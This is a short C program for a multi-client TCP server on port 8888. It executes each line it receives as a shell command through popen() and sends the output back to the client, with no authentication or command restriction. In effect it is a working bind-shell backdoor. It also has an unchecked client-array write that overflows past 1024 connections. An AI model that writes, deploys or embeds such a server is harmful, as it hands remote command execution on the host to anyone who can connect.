#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/select.h>

typedef struct sockaddr SOCKADDR;
typedef struct sockaddr_in SOCKADDR_IN;

int g_clients[1024] = {0};
int g_count = 0;

int main() {
    SOCKADDR_IN saddr, caddr;
    saddr.sin_family = AF_INET;
    saddr.sin_port = htons(8888);
    saddr.sin_addr.s_addr = inet_addr("0.0.0.0");

    int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == -1) {
        perror("Socket creation failed");
        exit(1);
    }
    
    // Add option to reuse address
    int opt = 1;
    if (setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
        perror("Setsockopt failed");
        exit(1);
    }

    if (bind(s, (SOCKADDR*)&saddr, sizeof(saddr)) != 0) {
        perror("Bind failed");
        exit(1);
    }

    if (listen(s, 10) != 0) {
        perror("Listen failed");
        exit(1);
    }
    
    fd_set fr;
    int max_sd;

    printf("Server listening on port 8888...\n");

    while (1) {
        FD_ZERO(&fr);
        FD_SET(s, &fr);
        max_sd = s;

        for (int i = 0; i < g_count; i++) {
            FD_SET(g_clients[i], &fr);
            if (g_clients[i] > max_sd)
                max_sd = g_clients[i];
        }

        int r = select(max_sd + 1, &fr, NULL, NULL, NULL);
        if (r < 0) {
            perror("select failed");
            break;
        }

        if (FD_ISSET(s, &fr)) {
            socklen_t clen = sizeof(caddr);
            int c = accept(s, (SOCKADDR*)&caddr, &clen);
            if (c < 0) {
                perror("Accept failed");
                continue;
            }
            g_clients[g_count++] = c;
            printf("Client connected: %s:%d\n", inet_ntoa(caddr.sin_addr), ntohs(caddr.sin_port));
        }

        for (int i = 0; i < g_count; i++) {
            if (FD_ISSET(g_clients[i], &fr)) {
                char buffer[1024] = {0};
                int bytes = recv(g_clients[i], buffer, sizeof(buffer) - 1, 0);
                if (bytes <= 0) {
                    printf("Client disconnected.\n");
                    close(g_clients[i]);
                    g_clients[i] = g_clients[g_count - 1];
                    g_count--;
                    i--;
                    continue;
                }

                buffer[strcspn(buffer, "\n")] = '\0';  
                printf("Received command: %s\n", buffer);

                FILE *fp = popen(buffer, "r");
                if (fp == NULL) {
                    char *err = "Failed to execute command\n";
                    send(g_clients[i], err, strlen(err), 0);
                    continue;
                }
                
                char result[1024];
                while (fgets(result, sizeof(result), fp) != NULL) {
                    send(g_clients[i], result, strlen(result), 0);
                }
                pclose(fp);
            }
        }
    }

    close(s);
    return 0;
}